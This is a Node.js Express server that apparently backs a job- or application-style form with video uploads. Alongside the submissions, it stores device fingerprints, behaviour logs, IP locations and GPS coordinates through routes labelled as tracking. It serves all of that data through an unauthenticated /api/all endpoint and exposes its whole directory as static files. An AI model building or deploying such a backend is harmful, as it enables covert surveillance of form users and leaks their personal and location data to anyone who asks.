const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('.'));

// Ensure data directory exists
const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

// Data files
const SUBMISSIONS_FILE = path.join(DATA_DIR, 'submissions.json');
const FINGERPRINT_FILE = path.join(DATA_DIR, 'fingerprints.json');
const BEHAVIOR_FILE = path.join(DATA_DIR, 'behavior.json');
const LOCATION_FILE = path.join(DATA_DIR, 'locations.json');
const GPS_FILE = path.join(DATA_DIR, 'gps.json');

// Helper: read JSON file
function readJSON(file) {
    if (fs.existsSync(file)) {
        try {
            return JSON.parse(fs.readFileSync(file, 'utf8'));
        } catch(e) { return []; }
    }
    return [];
}

// Helper: write JSON file
function writeJSON(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => {
        const unique = Date.now() + '_' + file.originalname;
        cb(null, unique);
    }
});
const upload = multer({ storage });

// Serve HTML pages
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/score', (req, res) => res.sendFile(path.join(__dirname, 'score.html')));

// ============================================================
// API ENDPOINTS
// ============================================================

// Get all submissions
app.get('/api/data', (req, res) => {
    res.json(readJSON(SUBMISSIONS_FILE));
});

// Get all tracking data
app.get('/api/all', (req, res) => {
    res.json({
        submissions: readJSON(SUBMISSIONS_FILE),
        fingerprints: readJSON(FINGERPRINT_FILE),
        behaviors: readJSON(BEHAVIOR_FILE),
        locations: readJSON(LOCATION_FILE),
        gps: readJSON(GPS_FILE)
    });
});

// Submit form data
app.post('/api/submit', upload.single('video'), (req, res) => {
    try {
        const formData = req.body;
        formData.timestamp = new Date().toISOString();
        formData.deviceId = req.body.deviceId || 'unknown';

        if (req.file) {
            formData.file = req.file.filename;
        }

        const submissions = readJSON(SUBMISSIONS_FILE);
        submissions.push(formData);
        writeJSON(SUBMISSIONS_FILE, submissions);

        res.json({ status: 'success', message: 'Application submitted!' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Fingerprint tracking
app.post('/api/fingerprint', (req, res) => {
    try {
        const data = req.body;
        data.timestamp = new Date().toISOString();
        const fingerprints = readJSON(FINGERPRINT_FILE);
        fingerprints.push(data);
        writeJSON(FINGERPRINT_FILE, fingerprints);
        console.log('✅ Fingerprint saved:', data.deviceId);
        res.json({ status: 'success' });
    } catch (error) {
        console.error('❌ Fingerprint error:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Behavior tracking
app.post('/api/behavior', (req, res) => {
    try {
        const data = req.body;
        data.timestamp = new Date().toISOString();
        const behaviors = readJSON(BEHAVIOR_FILE);
        behaviors.push(data);
        writeJSON(BEHAVIOR_FILE, behaviors);
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// IP Location tracking
app.post('/api/location', (req, res) => {
    try {
        const data = req.body;
        data.timestamp = new Date().toISOString();
        const locations = readJSON(LOCATION_FILE);
        locations.push(data);
        writeJSON(LOCATION_FILE, locations);
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// GPS tracking
app.post('/api/gps', (req, res) => {
    try {
        const data = req.body;
        data.timestamp = new Date().toISOString();
        const gpsData = readJSON(GPS_FILE);
        gpsData.push(data);
        writeJSON(GPS_FILE, gpsData);
        res.json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Serve uploaded files
app.get('/uploads/:filename', (req, res) => {
    const filepath = path.join(UPLOAD_DIR, req.params.filename);
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    } else {
        res.status(404).send('File not found');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
